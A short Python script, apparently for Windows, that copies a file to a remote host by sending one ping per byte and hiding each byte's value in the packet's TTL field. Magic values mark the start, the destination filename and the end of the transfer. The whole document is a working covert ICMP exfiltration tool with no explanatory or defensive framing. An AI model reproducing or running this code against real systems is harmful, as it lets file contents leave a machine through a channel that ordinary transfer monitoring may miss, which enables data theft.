import subprocess as sub
import sys
from time import sleep

class MagicNumber:
    BEGIN = 250
    TAKE_FILENAME = 251
    END_FILENAME = 252

    NOTHING = 253
    FINISH = 254


def ping_factory(host: str):
    def ping(ttl: int):
        args = ('ping', '-i', str(ttl), '-n', '1', host)
        sub.Popen(args, stdout=sub.PIPE)
    return ping

def main():

    src_file = sys.argv[1]
    host, dest_file = sys.argv[2].split(':')

    ping = ping_factory(host)

    ping(MagicNumber.NOTHING)
    sleep(1)
    ping(MagicNumber.BEGIN)

    for char in dest_file:
        ping(ord(char))

    ping(MagicNumber.END_FILENAME)

    with open(src_file, 'rb') as f:
        byte = f.read(1)
        while byte:
            ping(int.from_bytes(byte))
            byte = f.read(1)

    ping(MagicNumber.FINISH)


main()
